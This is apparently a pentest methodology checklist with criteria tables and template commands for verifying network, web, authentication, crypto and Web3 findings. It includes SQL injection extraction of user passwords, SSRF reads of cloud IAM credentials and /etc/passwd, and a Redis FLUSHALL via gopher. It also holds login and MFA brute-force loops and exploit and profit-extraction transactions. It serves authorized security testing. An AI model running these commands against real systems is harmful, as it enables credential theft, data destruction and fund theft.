# Verification Checklist by Finding Type

## Table of Contents

- [1. Network Findings](#1-network-findings)
- [1.1 Port Verification](#11-port-verification)
- [1.2 Service Banner Verification](#12-service-banner-verification)
- [1.3 Vulnerability Confirmation](#13-vulnerability-confirmation)
- [2. Web Findings](#2-web-findings)
- [2.1 XSS Verification](#21-xss-verification)
- [2.2 SQL Injection Verification](#22-sql-injection-verification)
- [2.3 CSRF Verification](#23-csrf-verification)
- [2.4 SSRF Verification](#24-ssrf-verification)
- [2.5 IDOR Verification](#25-idor-verification)
- [3. Authentication Findings](#3-authentication-findings)
- [3.1 Credential Verification](#31-credential-verification)
- [3.2 Session Verification](#32-session-verification)
- [3.3 MFA Bypass Verification](#33-mfa-bypass-verification)
- [4. Authorization Findings](#4-authorization-findings)
- [4.1 Privilege Escalation Verification](#41-privilege-escalation-verification)
- [4.2 Access Control Verification](#42-access-control-verification)
- [5. Cryptography Findings](#5-cryptography-findings)
- [5.1 Weak Algorithm Verification](#51-weak-algorithm-verification)
- [5.2 Key Management Verification](#52-key-management-verification)
- [6. Web3 Findings](#6-web3-findings)
- [6.1 Contract State Change Verification](#61-contract-state-change-verification)
- [6.2 Event Emission Verification](#62-event-emission-verification)
- [6.3 Profit Extraction Verification](#63-profit-extraction-verification)
- [7. Cross-Domain Findings](#7-cross-domain-findings)
- [7.1 Mixed Web2/Web3 Verification](#71-mixed-web2web3-verification)
- [7.2 Chain Confusion Verification](#72-chain-confusion-verification)
- [Universal Verification Criteria](#universal-verification-criteria)

Detailed verification criteria for each finding category. Every finding must pass ALL applicable criteria before receiving a VERIFIED verdict.

---

## 1. Network Findings

### 1.1 Port Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Port is open | `nmap -p <port> <host> --reason` | State is `open` (not `open\|filtered`) |
| Port is reachable | `nc -zv -w 5 <host> <port>` | Exit code 0, "succeeded" in output |
| Port is not firewall-filtered | `nmap -Pn -p <port> <host>` | No `filtered` state; consistent across runs |
| Port is not rate-limited | Run check 3x with 1s delay | Same result every run |

**Evidence required:**
```bash
nmap -p <port> <host> --reason -oN evidence/port-scan.txt
nc -zv -w 5 <host> <port> 2>&1 | tee evidence/banner.txt
```

### 1.2 Service Banner Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Banner is real | `nc -w 5 <host> <port>` and compare with known service | Banner matches expected service fingerprint |
| Banner is not spoofed | Send protocol-specific probe (e.g., HTTP request to port 80) | Response is consistent with banner claim |
| Version is accurate | `nmap -sV -p <port> <host>` | Version detection agrees with banner |
| Service responds correctly | Protocol-specific interaction (e.g., `curl` for HTTP, `openssl s_client` for TLS) | Service behaves as banner claims |

**Evidence required:**
```bash
# Raw banner capture
nc -w 5 <host> <port> < /dev/null 2>&1 | tee evidence/banner-raw.txt

# Version detection
nmap -sV -p <port> <host> --version-intensity 9 -oN evidence/version.txt

# Protocol verification
curl -v http://<host>:<port>/ 2>&1 | tee evidence/protocol-check.txt
```

### 1.3 Vulnerability Confirmation

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Vulnerability is exploitable | Run PoC/exploit against target | Side-effect assertion passes |
| Vulnerability is not patched | Test against known-patched version or check patch status | Vulnerability reproduces on unpatched target |
| Vulnerability is not a false positive | Cross-reference with false-positive patterns | No false positive pattern matches |
| Vulnerability is reproducible | Run PoC 3+ times | Same result every run |

**Evidence required:**
```bash
# PoC execution with side-effect assertion
<exploit-command> 2>&1 | tee evidence/exploit-run-1.txt
# Side-effect check
ls -la /path/to/created/file 2>&1 | tee evidence/side-effect.txt
```

---

## 2. Web Findings

### 2.1 XSS Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Payload is reflected | `curl -s "<url>?q=<payload>"` | Payload appears in response |
| Payload is not sanitized | Check response for encoding/escaping | Payload appears unencoded or weakly encoded |
| Payload executes in browser | Browser-based verification with headless Chrome or DOM inspection | `alert()` or `confirm()` fires; DOM is modified |
| Payload bypasses WAF | Test with encoded variants | At least one variant bypasses WAF |
| Context is appropriate | Analyze reflection context (HTML, attribute, JS, URL) | Payload is syntactically valid for context |

**Evidence required:**
```bash
# Reflection check
curl -s "<url>?q=<script>alert(1)</script>" | grep -F "alert(1)" | tee evidence/xss-reflection.txt

# Browser execution (headless)
# Use puppeteer/playwright to verify alert fires
node -e "
const puppeteer = require('puppeteer');
(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  page.on('dialog', async d => { console.log('ALERT:', d.message()); await d.accept(); });
  await page.goto('<url>?q=<script>alert(1)</script>');
  await browser.close();
})();
" 2>&1 | tee evidence/xss-browser.txt
```

### 2.2 SQL Injection Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Injection point is identified | Test parameter with single quote `'` | Error message or behavioral difference |
| Injection is exploitable | Test with `' OR 1=1--` and `' OR 1=1 LIMIT 1--` | Different response from baseline |
| Data can be extracted | Use `UNION SELECT` or blind extraction | Data appears in response or timing difference |
| Injection is not WAF-blocked | Test with encoded variants | At least one variant bypasses WAF |
| Database is identified | Test with DB-specific syntax | DB-specific error or behavior confirms type |

**Evidence required:**
```bash
# Baseline response
curl -s "<url>" > evidence/sqli-baseline.txt

# Injection test
curl -s "<url>' OR 1=1--" > evidence/sqli-injection.txt

# Diff
diff evidence/sqli-baseline.txt evidence/sqli-injection.txt | tee evidence/sqli-diff.txt

# Data extraction
curl -s "<url>' UNION SELECT user,password FROM users--" | tee evidence/sqli-data.txt
```

### 2.3 CSRF Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Action is state-changing | Identify the action (POST/PUT/DELETE) | Action modifies server state |
| No CSRF token | Inspect request for token parameter | No token in request |
| Token is not validated | Submit request without token | Action succeeds |
| Token is predictable | Analyze token generation | Token is weak/predictable (if applicable) |
| Attack is cross-origin | Test from different origin | Action succeeds cross-origin |

**Evidence required:**
```bash
# Request without token
curl -s -X POST "<url>/api/action" -d "param=value" -o evidence/csrf-no-token.txt

# Request with forged token
curl -s -X POST "<url>/api/action" -d "param=value&csrf_token=forged" -o evidence/csrf-forged.txt

# Cross-origin test
curl -s -X POST "<url>/api/action" -H "Origin: https://evil.com" -d "param=value" -o evidence/csrf-cross-origin.txt
```

### 2.4 SSRF Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| URL parameter is accepted | Submit URL parameter | Server fetches the URL |
| Internal access is possible | Test with `http://169.254.169.254/latest/meta-data/` | Internal data returned |
| Protocol restriction is bypassed | Test with `file://`, `gopher://`, `dict://` | Non-HTTP protocols work |
| DNS resolution is controllable | Test with internal hostnames | Internal hostnames resolve |
| Response is returned | Check if response includes fetched content | Fetched content appears in response |

**Evidence required:**
```bash
# Internal metadata access
curl -s "<url>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" | tee evidence/ssrf-metadata.txt

# File protocol
curl -s "<url>?url=file:///etc/passwd" | tee evidence/ssrf-file.txt

# Gopher protocol (Redis)
curl -s "<url>?url=gopher://127.0.0.1:6379/_FLUSHALL" | tee evidence/ssrf-gopher.txt
```

### 2.5 IDOR Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Object reference is predictable | Test sequential IDs | IDs are sequential or predictable |
| Authorization is missing | Access another user's object | Object returned without authorization |
| Authorization is client-side only | Modify client-side token/role | Access granted based on client-side value |
| Data is sensitive | Verify the returned data is sensitive | Data contains PII, credentials, or confidential info |
| Access is horizontal or vertical | Test same-role and cross-role access | Horizontal: same role, different user; Vertical: different role |

**Evidence required:**
```bash
# User 1 access
curl -s -H "Cookie: session=<user1>" "<url>/api/user/1/profile" | tee evidence/idor-user1.txt

# User 2 access (should fail but doesn't)
curl -s -H "Cookie: session=<user1>" "<url>/api/user/2/profile" | tee evidence/idor-user2.txt

# Compare
diff evidence/idor-user1.txt evidence/idor-user2.txt | tee evidence/idor-diff.txt
```

---

## 3. Authentication Findings

### 3.1 Credential Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Default credentials work | Try default username/password combinations | Authentication succeeds |
| Weak credentials are accepted | Test against password policy | Weak password accepted |
| Credentials are hardcoded | Search source code or config files | Hardcoded credentials found |
| Credentials are exposed | Check logs, error messages, or debug endpoints | Credentials visible in output |
| Brute force is possible | Test rate limiting on login | No rate limiting or weak rate limiting |

**Evidence required:**
```bash
# Default credential test
curl -s -X POST "<url>/login" -d "username=admin&password=admin" | tee evidence/creds-default.txt

# Weak password test
curl -s -X POST "<url>/login" -d "username=admin&password=password123" | tee evidence/creds-weak.txt

# Brute force test
for i in $(seq 1 100); do
  curl -s -X POST "<url>/login" -d "username=admin&password=guess$i" -o /dev/null -w "%{http_code}\n"
done | tee evidence/creds-bruteforce.txt
```

### 3.2 Session Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Session token is predictable | Analyze token generation pattern | Token is sequential or weakly random |
| Session fixation is possible | Set session token before login | Session token unchanged after login |
| Session does not expire | Test session after timeout period | Session still valid |
| Session is not invalidated on logout | Logout and reuse token | Token still works |
| Session is transmitted insecurely | Check for Secure/HttpOnly flags | Missing Secure or HttpOnly flag |

**Evidence required:**
```bash
# Session fixation
curl -s -c cookies.txt "<url>/login" -o /dev/null
curl -s -b cookies.txt -X POST "<url>/login" -d "username=admin&password=admin" -o /dev/null
curl -s -b cookies.txt "<url>/api/profile" | tee evidence/session-fixation.txt

# Session expiration
sleep 3600  # Wait for timeout
curl -s -b cookies.txt "<url>/api/profile" | tee evidence/session-expired.txt
```

### 3.3 MFA Bypass Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| MFA is not enforced | Skip MFA step | Access granted without MFA |
| MFA token is predictable | Test token generation | Token is weakly random |
| MFA can be brute-forced | Test multiple tokens | No rate limiting on MFA |
| MFA is not required for all endpoints | Test MFA on different endpoints | Some endpoints skip MFA |
| MFA bypass via response manipulation | Modify MFA response | MFA check bypassed |

**Evidence required:**
```bash
# Skip MFA
curl -s -X POST "<url>/api/login" -d "username=admin&password=admin&mfa_skip=1" | tee evidence/mfa-skip.txt

# Brute force MFA
for i in $(seq 0 9999); do
  curl -s -X POST "<url>/api/mfa" -d "code=$i" -o /dev/null -w "%{http_code}\n"
done | tee evidence/mfa-bruteforce.txt
```

---

## 4. Authorization Findings

### 4.1 Privilege Escalation Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Role can be modified | Test role parameter in request | Role escalation succeeds |
| Role check is client-side only | Modify client-side role value | Access granted based on client-side value |
| Role check is missing | Access admin endpoint without admin role | Admin endpoint accessible |
| Role check is flawed | Test with edge-case role values | Edge-case values bypass check |
| Privilege escalation is persistent | Verify escalation persists across requests | Escalated access works in subsequent requests |

**Evidence required:**
```bash
# Role modification
curl -s -H "Cookie: session=<user>" -H "X-Role: admin" "<url>/api/admin/users" | tee evidence/privesc-role.txt

# Client-side role bypass
curl -s -H "Cookie: session=<user>" "<url>/api/profile" -d "role=admin" | tee evidence/privesc-client.txt

# Missing role check
curl -s -H "Cookie: session=<user>" "<url>/api/admin/config" | tee evidence/privesc-missing.txt
```

### 4.2 Access Control Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Horizontal access control | Access another user's resource | Resource returned without authorization |
| Vertical access control | Access admin resource as regular user | Admin resource returned without authorization |
| Function-level access control | Access admin function as regular user | Admin function executes |
| Object-level access control | Access another user's object | Object returned without authorization |
| Access control is consistent | Test across multiple endpoints | Same access control flaw across endpoints |

**Evidence required:**
```bash
# Horizontal access control
curl -s -H "Cookie: session=<user1>" "<url>/api/user/2/documents" | tee evidence/access-horizontal.txt

# Vertical access control
curl -s -H "Cookie: session=<user1>" "<url>/api/admin/users" | tee evidence/access-vertical.txt

# Function-level access control
curl -s -H "Cookie: session=<user1>" -X POST "<url>/api/admin/delete-user" -d "id=2" | tee evidence/access-function.txt
```

---

## 5. Cryptography Findings

### 5.1 Weak Algorithm Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Algorithm is identified | Analyze code or configuration | Weak algorithm confirmed (MD5, SHA1, DES, RC4) |
| Algorithm is in use | Test with known weak algorithm | Weak algorithm is actually used |
| Algorithm is exploitable | Demonstrate collision or decryption | Collision found or data decrypted |
| Algorithm is not fallback-only | Verify algorithm is primary | Algorithm is not just a fallback |
| Algorithm is not deprecated but acceptable | Check against current standards | Algorithm is actually weak, not just deprecated |

**Evidence required:**
```bash
# Algorithm identification
grep -r "md5\|sha1\|des\|rc4" /path/to/config/ | tee evidence/crypto-weak.txt

# Collision demonstration (MD5)
echo -n "message1" | md5sum
echo -n "message2" | md5sum
# Use known collision pairs
```

### 5.2 Key Management Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Key is hardcoded | Search source code or config files | Hardcoded key found |
| Key is predictable | Analyze key generation | Key is weakly random |
| Key is reused | Check key usage across contexts | Same key used in multiple contexts |
| Key is exposed | Check logs, error messages, or debug endpoints | Key visible in output |
| Key rotation is missing | Check key rotation policy | No key rotation or weak rotation |

**Evidence required:**
```bash
# Hardcoded key search
grep -r "api_key\|secret_key\|private_key" /path/to/source/ | tee evidence/key-hardcoded.txt

# Key exposure in logs
curl -s "<url>/api/debug" | grep -i "key\|secret\|token" | tee evidence/key-exposed.txt

# Key reuse check
grep -r "same_key_value" /path/to/source/ | tee evidence/key-reuse.txt
```

---

## 6. Web3 Findings

### 6.1 Contract State Change Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| State change is observable | `cast storage <contract> <slot> --rpc-url $RPC_URL` | Storage slot value changed |
| State change is persistent | Check state after multiple blocks | State change persists |
| State change is unauthorized | Verify caller lacks required role | State changed without authorization |
| State change is exploitable | Demonstrate exploit path | Exploit successfully changes state |
| State change is not reverted | Check transaction status | Transaction not reverted |

**Evidence required:**
```bash
# Before state
cast storage <contract> <slot> --rpc-url $RPC_URL | tee evidence/state-before.txt

# Exploit transaction
cast send <contract> "<function>()" --private-key $PK --rpc-url $RPC_URL | tee evidence/exploit-tx.txt

# After state
cast storage <contract> <slot> --rpc-url $RPC_URL | tee evidence/state-after.txt

# State diff
diff evidence/state-before.txt evidence/state-after.txt | tee evidence/state-diff.txt
```

### 6.2 Event Emission Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Event is emitted | `cast logs --from-block <start> --to-block <end> --address <contract> <event_signature>` | Event found in logs |
| Event contains expected data | Decode event data | Event data matches expected values |
| Event is emitted multiple times | Check event across multiple transactions | Event emitted consistently |
| Event is not emitted on failure | Test failed transaction | Event not emitted on failure |
| Event is indexed correctly | Check event topics | Event topics are correctly indexed |

**Evidence required:**
```bash
# Event log
cast logs --from-block <start> --to-block <end> --address <contract> "EventName(type1,type2)" --rpc-url $RPC_URL | tee evidence/event-log.txt

# Event data decoding
cast logs --from-block <start> --to-block <end> --address <contract> "EventName(type1,type2)" --rpc-url $RPC_URL --json | jq '.[] | .data' | tee evidence/event-data.txt
```

### 6.3 Profit Extraction Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Profit is measurable | `cast balance <attacker_address> --rpc-url $RPC_URL` | Balance increased |
| Profit is extracted to external address | Check external address balance | External address received funds |
| Profit is not recoverable | Check if funds can be recovered | Funds are not recoverable by protocol |
| Profit is significant | Compare profit to TVL or expected yield | Profit is significant relative to protocol |
| Profit is reproducible | Run exploit multiple times | Same profit every run |

**Evidence required:**
```bash
# Before balance
cast balance <attacker_address> --rpc-url $RPC_URL | tee evidence/balance-before.txt

# Exploit transaction
cast send <contract> "<exploit_function>()" --private-key $PK --rpc-url $RPC_URL | tee evidence/exploit-tx.txt

# After balance
cast balance <attacker_address> --rpc-url $RPC_URL | tee evidence/balance-after.txt

# Profit calculation
echo "Profit: $(echo "$(cast balance <attacker_address> --rpc-url $RPC_URL) - $(cat evidence/balance-before.txt)" | bc)" | tee evidence/profit.txt
```

---

## 7. Cross-Domain Findings

### 7.1 Mixed Web2/Web3 Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Web2 component is verified | Apply web2 verification criteria | Web2 component passes all criteria |
| Web3 component is verified | Apply web3 verification criteria | Web3 component passes all criteria |
| Interaction is verified | Test the interaction between web2 and web3 | Interaction works as described |
| Attack chain is complete | Verify full attack chain from web2 to web3 | Full chain is exploitable |
| Impact is cross-domain | Verify impact spans both domains | Impact affects both web2 and web3 |

**Evidence required:**
```bash
# Web2 component
curl -s "<web2_url>" | tee evidence/web2-component.txt

# Web3 component
cast call <contract> "<function>()" --rpc-url $RPC_URL | tee evidence/web3-component.txt

# Interaction
curl -s -X POST "<web2_url>/api/web3" -d "action=exploit" | tee evidence/interaction.txt

# Full chain
# Document the full attack chain from web2 entry to web3 impact
```

### 7.2 Chain Confusion Verification

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Chain is identified | Verify chain ID | Chain ID matches expected chain |
| Cross-chain message is valid | Verify message format | Message is valid for target chain |
| Cross-chain message is delivered | Check message delivery | Message delivered to target chain |
| Cross-chain message is executed | Check message execution | Message executed on target chain |
| Cross-chain impact is verified | Verify impact on target chain | Impact confirmed on target chain |

**Evidence required:**
```bash
# Chain ID verification
cast chain-id --rpc-url $RPC_URL | tee evidence/chain-id.txt

# Cross-chain message
cast send <bridge_contract> "<message_function>()" --private-key $PK --rpc-url $RPC_URL | tee evidence/cross-chain-tx.txt

# Target chain verification
cast call <target_contract> "<message_status>()" --rpc-url $TARGET_RPC_URL | tee evidence/cross-chain-status.txt
```

---

## Universal Verification Criteria

These criteria apply to ALL finding types:

| Criterion | Method | Pass Condition |
|-----------|--------|----------------|
| Reproducibility | Run finding 3+ times | Same result every run |
| Side-effect assertion | Check for observable state change | Side-effect confirmed |
| Description match | Compare output to finding description | Output matches description |
| No false positive | Check against false-positive patterns | No false positive pattern matches |
| Not patched | Verify target is vulnerable version | Target is not patched |
| Not blocked | Verify no policy/rule blocks action | Action is not blocked |
| Evidence captured | Capture raw output, commands, timestamps | All evidence captured |
| Adversarial review | Review evidence without generator's reasoning | All review questions pass |
